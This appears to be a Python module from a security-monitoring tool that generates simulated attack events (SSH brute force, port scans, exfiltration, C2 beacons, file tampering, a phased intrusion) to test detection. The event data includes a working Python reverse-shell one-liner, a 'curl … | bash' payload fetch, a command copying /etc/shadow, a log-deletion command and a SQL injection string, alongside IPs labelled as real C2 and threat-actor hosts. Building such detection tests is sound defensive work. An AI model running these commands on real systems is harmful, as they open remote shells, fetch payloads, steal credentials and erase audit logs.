import asyncio
import logging
import random
from datetime import datetime, timezone

from normalizer.schema import RawEvent
from tests.sim.false_positive import simulate_false_positive_backup

logger = logging.getLogger("sentinel.sim")

THREAT_IPS = [
    '185.220.101.47',  # Tor exit node
    '194.165.16.71',   # Known scanner
    '45.95.147.236',   # Threat actor
    '91.92.248.165',   # Shodan scanner
]

REAL_USERNAMES = [
    'admin', 'root', 'ubuntu', 'oracle', 'guest', 'postgres',
    'ftpuser', 'mysql', 'jenkins', 'gitlab', 'deploy',
]

C2_IPS = [
    '45.33.32.156',   # Real C2 in threat intel
    '192.42.116.41',  # Tor C2
    '23.106.215.178', # CobaltStrike beacon
]



async def run_simulation(attack_type: str, queue: asyncio.Queue) -> int:
    """Run a predefined attack simulation by injecting events into the queue."""
    simulators = {
        'brute_force': simulate_brute_force,
        'lateral_movement': simulate_lateral_movement,
        'exfiltration': simulate_exfiltration,
        'c2_beacon': simulate_c2_beacon,
        'advanced_incident': simulate_advanced_incident,
        'false_positive': simulate_false_positive_backup,
    }

    simulator = simulators.get(attack_type)
    if not simulator:
        logger.warning(f"Unknown simulation type: {attack_type}")
        return 0

    count = await simulator(queue)
    logger.info(f"Simulation '{attack_type}' injected {count} events")
    return count


async def simulate_brute_force(queue: asyncio.Queue, source_ip: str = None,
                                count: int = 15, delay: float = 0.1) -> int:
    """Simulate realistic SSH Brute Force."""
    ip = source_ip or random.choice(THREAT_IPS)
    for i in range(count):
        user = random.choice(REAL_USERNAMES)
        port = random.randint(42000, 65000)
        event = RawEvent(
            source='linux_auth',
            event_type='login_failure',
            raw={'MESSAGE': f'Failed password for {user} from {ip} port {port} ssh2',
                 '_COMM': 'sshd'},
            timestamp=datetime.now(timezone.utc).isoformat()
        )
        await queue.put(event)
        await asyncio.sleep(delay)
    return count

# ... (keep existing password_spray, lateral_movement, exfiltration, c2_beacon, privilege_escalation)

async def simulate_password_spray(queue: asyncio.Queue, source_ip: str = "10.0.0.77",
                                   count: int = 8, delay: float = 0.2) -> int:
    """Simulate Password Spray (PS-001)."""
    users = ['admin', 'root', 'user1', 'jsmith', 'operator', 'backup', 'deploy', 'service']
    for i, user in enumerate(users[:count]):
        event = RawEvent(
            source='linux_auth',
            event_type='login_failure',
            raw={'MESSAGE': f'Failed password for {user} from {source_ip} port {33000 + i} ssh2',
                 '_COMM': 'sshd'},
            timestamp=datetime.now(timezone.utc).isoformat()
        )
        await queue.put(event)
        await asyncio.sleep(delay)
    return count

async def simulate_lateral_movement(queue: asyncio.Queue,
                                      source_ip: str = "192.168.1.55",
                                      dest_ip: str = "192.168.1.100",
                                      delay: float = 0.1) -> int:
    """Simulate Lateral Movement."""
    ports = [445, 22, 3389]
    count = 0
    for port in ports:
        event = RawEvent(
            source='linux_network',
            event_type='network_connect',
            raw={'local_ip': source_ip, 'local_port': 49000 + count,
                 'remote_ip': dest_ip, 'remote_port': port,
                 'pid': 1234, 'process_name': 'smbclient' if port == 445 else 'ssh',
                 'protocol': 'tcp', 'platform': 'linux'},
            timestamp=datetime.now(timezone.utc).isoformat()
        )
        await queue.put(event)
        count += 1
        await asyncio.sleep(delay)
    return count

async def simulate_exfiltration(queue: asyncio.Queue,
                                  dest_ip: str = "185.142.236.34",
                                  delay: float = 0.2) -> int:
    """Simulate Data Exfiltration."""
    events = [
        {'bytes_sent': 50_000_000, 'process': 'curl'},
        {'bytes_sent': 60_000_000, 'process': 'python3'},
        {'bytes_sent': 45_000_000, 'process': 'scp'},
    ]
    count = 0
    for e in events:
        event = RawEvent(
            source='linux_network',
            event_type='network_connect',
            raw={'local_ip': '192.168.1.10', 'local_port': 50000 + count,
                 'remote_ip': dest_ip, 'remote_port': 443,
                 'pid': 5678 + count, 'process_name': e['process'],
                 'protocol': 'tcp', 'bytes_sent': e['bytes_sent'],
                 'bytes_received': 1024, 'platform': 'linux'},
            timestamp=datetime.now(timezone.utc).isoformat()
        )
        await queue.put(event)
        count += 1
        await asyncio.sleep(delay)
    return count

async def simulate_c2_beacon(queue: asyncio.Queue,
                               dest_ip: str = None,
                               interval: float = 2.0,
                               count: int = 5) -> int:
    """Simulate realistic C2 Beacon."""
    ip = dest_ip or random.choice(C2_IPS)
    for i in range(count):
        event = RawEvent(
            source='linux_network',
            event_type='network_connect',
            raw={'local_ip': '192.168.1.10', 'local_port': 51000 + i,
                 'remote_ip': ip, 'remote_port': 8443,
                 'pid': 9999, 'process_name': 'beacon.elf',
                 'protocol': 'tcp', 'platform': 'linux'},
            timestamp=datetime.now(timezone.utc).isoformat()
        )
        await queue.put(event)
        await asyncio.sleep(interval)
    return count

async def simulate_privilege_escalation(queue: asyncio.Queue, delay: float = 0.1) -> int:
    """Simulate Privilege Escalation."""
    event = RawEvent(
        source='linux_process',
        event_type='privilege_escalation',
        raw={'pid': 7777, 'ppid': 7776, 'name': 'bash', 'username': 'root',
             'exe': '/bin/bash', 'cmdline': 'bash -i', 'uid': 0,
             'parent_name': 'exploit.py', 'platform': 'linux'},
        timestamp=datetime.now(timezone.utc).isoformat()
    )
    await queue.put(event)
    return 1

async def simulate_suspicious_process(queue: asyncio.Queue, delay: float = 0.1) -> int:
    """Simulate absolute Suspicious Process (Python reverse shell)."""
    ip = random.choice(C2_IPS)
    event = RawEvent(
        source='linux_process',
        event_type='suspicious_process',
        raw={'pid': 31337, 'ppid': 1234, 'name': 'python3', 'username': 'www-data',
             'uid': 33, 'exe': '/usr/bin/python3',
             'cmdline': f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
             'parent_name': 'apache2', 'platform': 'linux'},
        timestamp=datetime.now(timezone.utc).isoformat()
    )
    await queue.put(event)
    return 1

async def simulate_port_scan(queue: asyncio.Queue,
                              attacker_ip: str = "10.0.0.99",
                              target_ip: str = "192.168.1.10",
                              count: int = 25, delay: float = 0.05) -> int:
    """Simulate Port Scanning with fixed IP direction."""
    ports = list(range(20, 20 + count))
    for port in ports:
        event = RawEvent(
            source='linux_network',
            event_type='network_connect',
            raw={'local_ip': attacker_ip, 'local_port': port,
                 'remote_ip': target_ip, 'remote_port': port,
                 'pid': None, 'process_name': 'nmap', 'protocol': 'tcp', 'platform': 'linux'},
            timestamp=datetime.now(timezone.utc).isoformat()
        )
        await queue.put(event)
        await asyncio.sleep(delay)
    return count

async def simulate_web_attack(queue: asyncio.Queue,
                               attacker_ip: str = '185.220.101.47') -> int:
    """Simulate web application attacks — HTTP layer."""
    attacks = [
        {'method': 'POST', 'url': '/login', 'status': 401, 'agent': 'python-requests/2.28', 'size': 45},
        {'method': 'POST', 'url': '/login', 'status': 401, 'agent': 'python-requests/2.28', 'size': 45},
        {'method': 'POST', 'url': '/login', 'status': 401, 'agent': 'python-requests/2.28', 'size': 45},
        {'method': 'GET',  'url': "/admin?id=1' OR '1'='1", 'status': 500, 'agent': 'sqlmap/1.7.8', 'size': 0},
        {'method': 'GET',  'url': '/admin/config.php', 'status': 403, 'agent': 'sqlmap/1.7.8', 'size': 0},
        {'method': 'POST', 'url': '/upload', 'status': 200, 'agent': 'curl/7.88', 'size': 524288},
    ]
    for a in attacks:
        event = RawEvent(
            source='http_access_log',
            event_type='login_failure' if a['status'] == 401 else 'http_request',
            raw={**a, 'client_ip': attacker_ip, 'platform': 'linux'},
            timestamp=datetime.now(timezone.utc).isoformat()
        )
        await queue.put(event)
        await asyncio.sleep(0.3)
    return len(attacks)


async def simulate_file_integrity_attack(queue: asyncio.Queue) -> int:
    """Simulate mass file modification / unauthorized /etc access."""
    files = [
        ('/etc/passwd', 'file_modified'),
        ('/etc/shadow', 'file_modified'),
        ('/bin/bash', 'file_modified'),
        ('/tmp/.hidden_exploit', 'file_created'),
        ('/var/log/auth.log', 'file_deleted'),
    ]
    for path, action in files:
        await queue.put(RawEvent(
            source='linux_file',
            event_type=action,
            raw={'file_path': path, 'file_action': action, 'is_directory': False, 'platform': 'linux'},
            timestamp=datetime.now(timezone.utc).isoformat()
        ))
        await asyncio.sleep(0.5)
    return len(files)


async def simulate_full_chain(queue: asyncio.Queue) -> int:
    """Complete Attack Chain with realistic source."""
    total = 0
    source_ip = random.choice(THREAT_IPS)
    n = await simulate_brute_force(queue, source_ip=source_ip, count=12, delay=0.05)
    total += n
    await asyncio.sleep(1)
    n = await simulate_lateral_movement(queue, source_ip=source_ip, dest_ip="192.168.1.100")
    total += n
    await asyncio.sleep(1)
    n = await simulate_exfiltration(queue, dest_ip=random.choice(C2_IPS))
    total += n
    return total


async def simulate_advanced_incident(queue: asyncio.Queue) -> int:
    """
    Advanced Phased Simulation (Inspired by intelliSOC).
    Timeline: Recon -> Brute Force -> Success -> Post-Exploitation.
    Perfect for demonstrating correlation and AI narratives.
    """
    total = 0
    attacker_ip = random.choice(THREAT_IPS)
    target_ip = "192.168.1.10"
    user = "admin"

    # Phase 1: Reconnaissance (Port Scan)
    logger.info(f"[SIM] Phase 1: Recon from {attacker_ip}")
    n = await simulate_port_scan(queue, attacker_ip=attacker_ip, target_ip=target_ip, count=10)
    total += n
    await asyncio.sleep(2)

    # Phase 2: Brute Force
    logger.info(f"[SIM] Phase 2: Brute Force on {user}")
    n = await simulate_brute_force(queue, source_ip=attacker_ip, count=15, delay=0.1)
    total += n
    await asyncio.sleep(2)

    # Phase 3: Success & Post-Exploitation
    logger.info("[SIM] Phase 3: Login Success & Malware Spawn")
    # Login Success
    await queue.put(RawEvent(
        source='linux_auth', event_type='login_success',
        raw={'MESSAGE': f'Accepted password for {user} from {attacker_ip} port 22 ssh2', '_COMM': 'sshd'},
        timestamp=datetime.now(timezone.utc).isoformat()
    ))
    total += 1
    await asyncio.sleep(1)

    # Suspicious Commands
    commands = [
        f"curl http://{attacker_ip}/payload.sh | bash",
        "cat /etc/shadow > /tmp/.dump",
        "rm -rf /var/log/auth.log"
    ]
    for cmd in commands:
        await queue.put(RawEvent(
            source='linux_process', event_type='suspicious_process',
            raw={'pid': random.randint(10000, 20000), 'ppid': 1234, 'name': 'bash',
                 'username': 'root', 'exe': '/bin/bash', 'cmdline': cmd,
                 'uid': 0, 'parent_name': 'sshd', 'platform': 'linux'},
            timestamp=datetime.now(timezone.utc).isoformat()
        ))
        total += 1
        await asyncio.sleep(0.5)

    return total
